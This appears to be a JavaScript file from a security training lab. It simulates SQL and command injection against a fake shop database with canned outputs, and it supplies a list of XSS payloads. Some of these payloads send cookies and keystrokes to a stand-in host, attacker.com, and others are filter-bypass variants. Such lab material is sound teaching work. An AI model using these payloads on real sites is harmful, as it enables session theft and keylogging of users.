// Advanced Vulnerability Simulation Engine
window.VulnSim = {
  // Advanced SQL Injection Simulator
  simulateSQL(sql) {
    const sqlLower = (sql || "").toLowerCase().trim();
    const sqlOriginal = String(sql || "").trim();
    
    // Simulate realistic database structure
    const db = {
      users: [
        { id: 1, username: 'admin', password: '5f4dcc3b5aa765d61d8327deb882cf99', email: 'admin@vulnshop.com', role: 'admin', created_at: '2024-01-15 10:30:00' },
        { id: 2, username: 'alice', password: 'e10adc3949ba59abbe56e057f20f883e', email: 'alice@example.com', role: 'user', created_at: '2024-02-20 14:15:00' },
        { id: 3, username: 'bob', password: '25d55ad283aa400af464c76d713c07ad', email: 'bob@example.com', role: 'user', created_at: '2024-03-10 09:20:00' },
        { id: 4, username: 'carol', password: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8', email: 'carol@example.com', role: 'moderator', created_at: '2024-04-05 16:45:00' }
      ],
      products: [
        { id: 1, name: 'Wireless Earbuds Pro', price: 69.00, stock: 150 },
        { id: 2, name: 'Smart Home Hub', price: 129.00, stock: 45 },
        { id: 3, name: 'Mechanical Keyboard', price: 89.00, stock: 78 }
      ],
      orders: [
        { id: 1, user_id: 2, total: 198.00, status: 'completed', date: '2024-10-15' },
        { id: 2, user_id: 3, total: 89.00, status: 'pending', date: '2024-10-20' }
      ]
    };

    // UNION-based SQL Injection
    if (sqlLower.includes('union') && sqlLower.includes('select')) {
      if (sqlLower.includes('username') || sqlLower.includes('password') || sqlLower.includes('email')) {
        let result = "id | username | password | email | role\n";
        result += "---+----------+----------+----------------------+----------\n";
        db.users.forEach(u => {
          result += `${u.id}  | ${u.username.padEnd(8)} | ${u.password} | ${u.email.padEnd(20)} | ${u.role}\n`;
        });
        return result;
      }
      
      if (sqlLower.includes('@@version') || sqlLower.includes('version()')) {
        return "version()\n----------\n8.0.35-0ubuntu0.22.04.1\n";
      }
      
      if (sqlLower.includes('database()') || sqlLower.includes('schema()')) {
        return "database()\n-----------\nvulnshop_production\n";
      }
      
      if (sqlLower.includes('user()') || sqlLower.includes('current_user')) {
        return "user()\n-------\nroot@localhost\n";
      }
      
      if (sqlLower.includes('table_name') || sqlLower.includes('information_schema')) {
        return "TABLE_NAME\n----------\nusers\nproducts\norders\nsessions\napi_keys\nconfig\n";
      }
      
      // Default UNION response
      return "id | email | created_at\n---+----------------------+---------------------\n1  | admin@vulnshop.com  | 2024-01-15 10:30:00\n2  | alice@example.com   | 2024-02-20 14:15:00\n3  | bob@example.com     | 2024-03-10 09:20:00";
    }
    
    // Error-based SQL Injection
    if (sqlLower.includes('extractvalue') || sqlLower.includes('updatexml')) {
      const match = sqlOriginal.match(/extractvalue\([^,]+,\s*['"]([^'"]+)['"]\)/i) || 
                    sqlOriginal.match(/updatexml\([^,]+,\s*['"]([^'"]+)['"]/i);
      if (match) {
        return `ERROR 1105 (HY000): XPATH syntax error: '${match[1]}'\nQuery: ${sqlOriginal}`;
      }
      return "ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'\nERROR 1062 (23000): Duplicate entry '1' for key 'PRIMARY'";
    }
    
    if (sqlLower.includes('floor(') && sqlLower.includes('rand(')) {
      return "ERROR 1062 (23000): Duplicate entry '1' for key 'PRIMARY'\n[Database version: 8.0.35]";
    }
    
    // Time-based blind SQL Injection
    if (sqlLower.includes('sleep(') || sqlLower.includes('benchmark(') || sqlLower.includes('waitfor')) {
      const sleepMatch = sqlOriginal.match(/sleep\((\d+)\)/i);
      const delay = sleepMatch ? parseInt(sleepMatch[1]) : 5;
      return `Query executed with ${delay}s delay.\nThis indicates a time-based blind SQL injection vulnerability.\n\nid | email\n---+----------------------\n1  | admin@vulnshop.com`;
    }
    
    // Boolean-based blind
    if (sqlOriginal.includes("'1'='1") || sqlOriginal.includes("'1'='1'") || sqlOriginal.includes("1=1")) {
      return "id | email | created_at\n---+----------------------+---------------------\n1  | admin@vulnshop.com  | 2024-01-15 10:30:00\n2  | alice@example.com   | 2024-02-20 14:15:00\n3  | bob@example.com     | 2024-03-10 09:20:00\n4  | carol@example.com   | 2024-04-05 16:45:00";
    }
    
    if (sqlOriginal.includes("'1'='2") || sqlOriginal.includes("'1'='2'") || sqlOriginal.includes("1=2")) {
      return "id | email | created_at\n---+----------------------+---------------------";
    }
    
    // Stacked queries
    if (sqlOriginal.includes(';') && (sqlLower.includes('drop') || sqlLower.includes('delete') || sqlLower.includes('update') || sqlLower.includes('insert'))) {
      return "ERROR: Multi-statement queries are disabled for security.\nHowever, in a real vulnerable application, this might execute.\n\n⚠️ WARNING: Stacked query injection detected!";
    }
    
    // Regular SELECT queries
    if (sqlLower.includes('select')) {
      if (sqlLower.includes('from users')) {
        return "id | username | email | role\n---+----------+----------------------+----------\n1  | admin    | admin@vulnshop.com  | admin\n2  | alice    | alice@example.com   | user\n3  | bob      | bob@example.com     | user\n4  | carol    | carol@example.com    | moderator";
      }
      if (sqlLower.includes('from products')) {
        return "id | name | price | stock\n---+----------------------+-------+-------\n1  | Wireless Earbuds Pro | 69.00 | 150\n2  | Smart Home Hub      | 129.00| 45\n3  | Mechanical Keyboard | 89.00 | 78";
      }
      return "id | email | created_at\n---+----------------------+---------------------\n1  | admin@vulnshop.com  | 2024-01-15 10:30:00\n2  | alice@example.com   | 2024-02-20 14:15:00";
    }
    
    // INSERT, UPDATE, DELETE
    if (sqlLower.includes('insert') || sqlLower.includes('update') || sqlLower.includes('delete')) {
      return "Query OK, 1 row affected (0.02 sec)\n⚠️ WARNING: Data modification queries should be restricted!";
    }
    
    // DROP, TRUNCATE
    if (sqlLower.includes('drop') || sqlLower.includes('truncate')) {
      return "ERROR 1044 (42000): Access denied for user 'app_user'@'localhost' to database 'vulnshop_production'\n⚠️ In a real vulnerable scenario, this might succeed!";
    }
    
    return "Query OK, 0 rows affected (0.00 sec)";
  },

  // Advanced Command Injection Simulator
  simulateCommand(cmd) {
    const cmdLower = cmd.toLowerCase();
    
    // Detect command injection patterns
    if (cmd.includes(';') || cmd.includes('&&') || cmd.includes('|') || cmd.includes('`') || cmd.includes('$(')) {
      const commands = cmd.split(/[;&|`$()]/).filter(c => c.trim());
      
      let output = "Command injection detected!\n\n";
      output += "Executed commands:\n";
      output += "==================\n\n";
      
      commands.forEach((c, i) => {
        const cleanCmd = c.trim();
        if (cleanCmd) {
          output += `[${i + 1}] ${cleanCmd}\n`;
          
          // Simulate command outputs
          if (cleanCmd.includes('cat') && cleanCmd.includes('/etc/passwd')) {
            output += "root:x:0:0:root:/root:/bin/bash\n";
            output += "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n";
            output += "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n";
            output += "mysql:x:103:106:MySQL Server,,,:/nonexistent:/bin/false\n\n";
          } else if (cleanCmd.includes('whoami')) {
            output += "www-data\n\n";
          } else if (cleanCmd.includes('id')) {
            output += "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n";
          } else if (cleanCmd.includes('uname')) {
            output += "Linux vulnshop-server 5.15.0-72-generic #79-Ubuntu SMP Wed Apr 19 08:22:18 UTC 2023 x86_64\n\n";
          } else if (cleanCmd.includes('pwd')) {
            output += "/var/www/html\n\n";
          } else if (cleanCmd.includes('ls')) {
            output += "index.html\nadmin/\nassets/\nconfig.php\nuploads/\n\n";
          } else if (cleanCmd.includes('env')) {
            output += "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n";
            output += "DB_PASSWORD=super_secret_password_123\n";
            output += "API_KEY=sk_live_51aBcDeFgHiJkLmNoPqRsTuVwXyZ\n\n";
          } else {
            output += `Command executed: ${cleanCmd}\n\n`;
          }
        }
      });
      
      output += "⚠️ WARNING: Command injection successful! In a real scenario, this could lead to:\n";
      output += "- Remote code execution\n";
      output += "- Data exfiltration\n";
      output += "- System compromise\n";
      
      return output;
    }
    
    // Normal ping command
    if (cmdLower.includes('ping')) {
      return `PING ${cmd} (127.0.0.1): 56 data bytes\n64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.123 ms\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.098 ms\n\n--- ${cmd} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`;
    }
    
    return "Command executed successfully";
  },

  // Advanced XSS Payload Generator
  generateXSSPayloads() {
    return {
      basic: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
      ],
      advanced: [
        "<script>fetch('/api/steal?cookie='+document.cookie)</script>",
        "<img src=x onerror=\"fetch('http://attacker.com/steal?data='+document.cookie)\">",
        "<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>",
        "<svg onload=\"setInterval(function(){fetch('http://attacker.com/keylog?key='+String.fromCharCode(event.keyCode))},100)\">",
        "<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/keylog?key='+e.key)})</script>"
      ],
      dom: [
        "#<script>alert(document.cookie)</script>",
        "#<img src=x onerror=alert(document.domain)>",
        "#javascript:alert(document.cookie)",
        "#<svg onload=alert(window.location)>"
      ],
      filterBypass: [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror='alert(String.fromCharCode(88,83,83))'>",
        "<iframe srcdoc='<script>parent.alert(1)</script>'>"
      ]
    };
  }
};
